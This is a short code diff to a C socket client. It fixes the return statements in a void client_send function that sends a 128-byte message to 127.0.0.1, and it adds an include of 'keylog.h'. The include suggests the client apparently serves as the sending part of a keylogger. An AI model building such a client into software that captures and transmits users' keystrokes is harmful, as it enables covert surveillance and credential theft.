@@ -2,6 +2,7 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include "keylog.h"
  
 void client_send(char message[128])
 {
@@ -11,7 +12,7 @@ void client_send(char message[128])
     //Create socket
     if ((socket_desc = socket(AF_INET , SOCK_STREAM , 0)) == -1)
     {
-	return 1;
+	return;
     }
          
     server.sin_addr.s_addr = inet_addr("127.0.0.1");
@@ -21,13 +22,13 @@ void client_send(char message[128])
     //Connect to remote server
     if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
     {
-        return 1;
+        return;
     }
      
     //Send some data
     if( send(socket_desc , message , 128 , 0) < 0)
     {
-        return 1;
+        return;
     }     
-    return 0;
+    return;
 }
